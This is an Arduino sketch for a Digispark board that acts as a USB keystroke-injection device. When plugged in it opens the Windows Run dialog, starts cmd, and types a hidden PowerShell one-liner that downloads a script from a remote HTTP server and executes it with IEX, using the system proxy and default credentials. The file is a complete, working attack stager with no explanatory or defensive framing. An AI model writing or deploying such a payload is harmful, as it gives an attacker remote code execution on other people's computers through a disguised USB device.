#include "DigiKeyboard.h"

void setup() {
  // don't need to set anything up to use DigiKeyboard
  DigiKeyboard.sendKeyStroke(0);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(60);
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(600);
  DigiKeyboard.println("powershell.exe -nop -w hidden -c $c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $c.downloadstring('http://192.168.1.10:8080/exploit');");
  }


void loop() {

}